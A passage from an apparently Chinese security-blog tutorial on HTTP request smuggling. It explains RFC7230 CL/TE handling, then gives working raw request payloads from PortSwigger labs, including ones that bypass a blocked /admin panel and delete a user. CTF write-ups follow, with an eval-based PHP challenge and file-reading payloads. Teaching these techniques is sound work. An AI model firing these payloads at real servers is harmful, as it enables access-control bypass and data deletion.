之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF（\r\n），也不包括分块数据结尾的 CRLF。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p><h3 id="CL与TE解析优先级顺序"><a href="#CL与TE解析优先级顺序" class="headerlink" title="CL与TE解析优先级顺序"></a>CL与TE解析优先级顺序</h3><p>CL表示Content-Length，TE表示Transfer-Encoding。</p><p>优先级顺序详见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3 </a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">If</span> a message <span class="hljs-keyword">is</span> received <span class="hljs-keyword">with</span> <span class="hljs-keyword">both</span> a Transfer-<span class="hljs-keyword">Encoding</span> <span class="hljs-keyword">and</span> a<br>Content-Length <span class="hljs-keyword">header</span> field, the Transfer-<span class="hljs-keyword">Encoding</span> overrides the<br>Content-Length. Such a message might indicate an attempt <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span><br>request smuggling (Section <span class="hljs-number">9.5</span>) <span class="hljs-keyword">or</span> response splitting (Section <span class="hljs-number">9.4</span>)<br><span class="hljs-keyword">and</span> ought <span class="hljs-keyword">to</span> be handled <span class="hljs-keyword">as</span> an error. A sender MUST remove the received Content-Length field prior <span class="hljs-keyword">to</span> forwarding such a message downstream.<br></code></pre></td></tr></table></figure><p>TE 优先于 CL ，但可以通过一些方式绕过</p><h2 id="请求走私分类"><a href="#请求走私分类" class="headerlink" title="请求走私分类"></a>请求走私分类</h2><p>请求走私攻击包括将Content-Length标头和Transfer-Encoding 标头都放入单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><ul><li>CL不为0:前端代理服务器允许请求携带请求体，而后端服务器不允许请求携带请求体。</li><li>CL-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li><li>CL-TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer- Encoding标头。</li><li>TE-TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。</li><li>TE-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li></ul><h3 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h3><p>所有不携带请求体的HTTP请求都有可能受此影响,这里以GET请求为例。</p><p>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p>比如构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 44\r\n<br>\r\n<br>GET /secret HTTP/1.1\r\n<br>Host: demo.com\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p><strong>注：\r\n表示 CRLF即换行</strong></p><p>前端服务器处理了Content-Length，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求：</p><p>第一个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET / HTTP/1.1\r\n<br>Host: demo.com\r\n<br></code></pre></td></tr></table></figure><p>第二个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /secret HTTP/1.1\r\n<br>Host: demo.com\r\n<br></code></pre></td></tr></table></figure><h3 id="CL-CL漏洞"><a href="#CL-CL漏洞" class="headerlink" title="CL-CL漏洞"></a>CL-CL漏洞</h3><p><strong>RFC7230规范</strong>：在RFC7230的<a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">第3.3.3节</a>中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。</p><p>构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 5\r\n<br>Content-Length: 6\r\n<br>\r\n<br>12345\r\n<br>a<br></code></pre></td></tr></table></figure><p>得到响应，返回400 Bad Request<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185910-522340.png" alt="2"><br><strong>触发过程</strong></p><p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p><h3 id="CL-TE漏洞"><a href="#CL-TE漏洞" class="headerlink" title="CL-TE漏洞"></a>CL-TE漏洞</h3><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">CL.TE实验环境</a></p><blockquote><p>实验描述：<br>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码（Transfer-Encoding解析），前端服务器拒绝未使用GET或POST方法之外的请求。</p><p>实验要求：<br>将请求走私到后端服务器，以便后端服务器处理的下一个请求像是使用了GPOST方法。</p></blockquote><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185934-758668.png" alt="labs1"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190020-357686.png" alt="1"><br>将请求行中请求方式修改为POST,在请求行添加Transfer-<code>Encoding: chunked</code>，然后在实体中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求就可以获得响应。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190033-562357.png" alt="2"><br>分析：连续请求，G会被带入下一个请求，变为 <code>GPOST / HTTP/1.1\r\n</code></p><p><strong>触发过程</strong></p><p>前端服务器处理Content-Length头并确定请求主体长度为6个字节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G<br></code></pre></td></tr></table></figure><p>此请求经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到<code>0\r\n\r\n</code>时，会被认为已经读取到结尾了，但是剩下的字母G就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，G会被带入下一个请求，发送的请求在后端服务器变为 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">GPOST / HTTP/1.1\r\n<br></code></pre></td></tr></table></figure><p>服务器在解析时会产生报错</p><h3 id="TE-TE漏洞"><a href="#TE-TE漏洞" class="headerlink" title="TE-TE漏洞"></a>TE-TE漏洞</h3><p>在这里，前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p><p>详见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3.3</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">If a Transfer-Encoding header field is present <span class="hljs-keyword">in</span> a response and<br>the chunked transfer coding is not the final encoding, the<br>message body length is determined by reading the connection until<br>it is closed by the server.  If a Transfer-Encoding header field<br>is present <span class="hljs-keyword">in</span> a request and the chunked transfer coding is not<br>the final encoding, the message body length cannot be determined<br>reliably; the server MUST respond with the 400 (Bad Request)<br>status code and <span class="hljs-keyword">then</span> close the connection.<br></code></pre></td></tr></table></figure><p>这里列出七种混淆方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Transfer-Encoding: xchunked<br><br>Transfer-Encoding : chunked<br><br>Transfer-Encoding: x<br><br>Transfer-Encoding:[tab]chunked<br><br>[space]Transfer-Encoding: chunked<br><br>X: X[\n]Transfer-Encoding: chunked<br><br>Transfer-Encoding<br>: chunked<br></code></pre></td></tr></table></figure><p>之所以在处理这些请求头时会出现问题，是因为在实际的HTTP协议实现中，很少有代码精确的遵循了其中的规范，以此导致面对变形的请求头时会出现不同的处理方式。而我们所要做的就是找到其中存在问题的服务器，然后使用类似前两个情形的攻击报文走私数据。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.TE验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185807-72744.png" alt="QQ截图20210406190848"><br>构造请求，注意同样需要去掉勾选Update Content-Length</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>Transfer-encoding: cow\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190116-607083.png" alt="2"></p><p>分析：前端将body的内容视为正常请求，到了后端，因为<code>Transfer-encoding: cow</code>无法识别，将会转而使用<code>Content-length: 4</code>，从而产生报错</p><h3 id="TE-CL漏洞"><a href="#TE-CL漏洞" class="headerlink" title="TE-CL漏洞"></a>TE-CL漏洞</h3><p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CL验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190225-786616.png" alt="timu"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190234-493978.png" alt="1"><br>进入实验，首先需要去掉勾选Update Content-Length防止Buprsuite自动更新Content-Length字段<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190250-681892.png" alt="0"><br>构造请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>......<br>Transfer-Encoding: chunked\r\n<br>Content-Length: 3\r\n<br>\r\n<br>1\r\n<br>G\r\n<br>0\r\n<br>\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190306-543465.png" alt="2"><br>G和0被走私了，带入了带入下一个请求，响应报文请求方法是G0POST，我们需要完整构造GPOST报文请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>12\r\n<br>GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续请求两次<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190317-764210.png" alt="3"></p><p>官方提供的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: your-lab-id.web-security-academy.net\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded\r\n<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190337-171562.png" alt="4"><br><strong>触发过程</strong><br>由于前端服务器处理Transfer-Encoding，当其读取到0\r\n\r\n时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，当它读取完12\r\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>成功报错。</p><p>前端服务器处理Transfer-Encoding标头，因此将消息正文视为使用分块编码。它处理第一个块，声明为12个字节长，直到下一行的开始<code>GPOST / HTTP/1.1</code>。它处理第二个数据块，该数据块的长度为零，因此被视为终止请求。该请求被转发到后端服务器。</p><p>后端服务器处理Content-Length标头，并确定请求主体的长度为4个字节，直到下一行的开始12。以下以开头的字节<code>GPOST / HTTP/1.1</code>未处理，后端服务器会将其视为序列中下一个请求的开始。</p><h2 id="绕过前端服务器安全控制"><a href="#绕过前端服务器安全控制" class="headerlink" title="绕过前端服务器安全控制"></a>绕过前端服务器安全控制</h2><blockquote><p>实验描述：</p><p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p><p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p></blockquote><h3 id="利用CL-TE漏洞绕过"><a href="#利用CL-TE漏洞绕过" class="headerlink" title="利用CL-TE漏洞绕过"></a>利用CL-TE漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a></p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190419-108405.png" alt="timu"></p><blockquote><p>实验描述：</p><p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p><p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p></blockquote><p>按照要求访问管理面板/admin，会提示Path /admin is blocked</p><p>利用CL-TE漏洞，构造数据包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 37<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>X-Ignore: X<br></code></pre></td></tr></table></figure><p>发现只能本地用户查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190431-281494.png" alt="1"><br>连续两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 54<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>X-Ignore: X<br></code></pre></td></tr></table></figure><p>观察到由于第二个请求的Host标头与第一个请求中的走私Host标头冲突，该请求被阻止。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190443-9518.png" alt="2"><br>两次发出以下请求，以便将第二个请求的标头附加到走私的请求正文中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 116<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure><p>现在可以访问管理面板</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190458-985555.png" alt="3"><br>根据响应内容，更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 139<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure><p>没有回显内容，使用上个数据包访问管理面板，验证是否删除成功<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190522-947042.png" alt="5"></p><h3 id="利用TE-CL漏洞绕过"><a href="#利用TE-CL漏洞绕过" class="headerlink" title="利用TE-CL漏洞绕过"></a>利用TE-CL漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190536-739950.png" alt="题目"><br>这次利用TE-CL漏洞，构造数据包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>60<br>POST /admin HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>允许本地查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190544-763227.png" alt="1"><br>两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Type: application/x-www-form-urlencoded<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>71<br>POST /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>成功访问管理员页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190552-248001.png" alt="2"><br>更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>87<br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>访问管理员页面验证是否删除</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190623-841809.png" alt="3"></p><h2 id="CTF中的请求走私"><a href="#CTF中的请求走私" class="headerlink" title="CTF中的请求走私"></a>CTF中的请求走私</h2><p><strong>HGAME2021-宝藏走私者</strong></p><p>hint: 注意留意服务器信息<br>资料：<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a><br>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br>为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br>调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br>这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？<br><img src="https://img-blog.csdnimg.cn/20210206224207823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>点击超链接跳转到/secret，发现响应包中提示需要<code>client-ip</code>头</p><p><img src="https://img-blog.csdnimg.cn/20210206224349121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>将client-ip改为127.0.0.1，发现还是不行，猜测是反代会将真实ip带到后面，抓包看到服务器是ATS/7.1.2，反代服务器本版存在HTTP Smuggling CL-TE 漏洞，可以利用HTTP请求走私</p><p>构造请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>hrs.localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>73<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br>0<br><br><span class="hljs-keyword">GET</span> <span class="hljs-string">/secret</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>hrs.localhost<br><span class="hljs-attribute">Client-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br></code></pre></td></tr></table></figure><p>由于没有赛后复现没有环境，贴一张其他大师傅的wp</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202105/02/225619-18140.png" alt="image-20210502225618544"></p><p><strong>[RoarCTF 2019]Easy Calc</strong><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190649-214946.png" alt="题目"><br>calc.php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在phpifo页面中发现禁用了一些函数和字符，所以尝试绕过，可以利用请求走私。</p><p>利用CL-CL漏洞，返回400错误,同时可以看到phpinfo页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191236-584099.png" alt="CL-CL-phpinfo"><br><code>getcwd()</code>:获取到当前工作目录/var/www/html<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191456-261196.png" alt="getcwd"><br><code>var_dump(scandir(dirname(__FILE__)))</code>：获取当前目录下的文件<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191607-151742.png" alt="dir"><br><code>print_r(scandir(chr(47)))</code>：扫描根目录<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191701-2570.png" alt="ls"><br><code>var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>：读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191814-959740.png" alt="flag"><br>同样利用CL-TE漏洞同样可以读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/192008-795497.png" alt="cl-te"></p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" 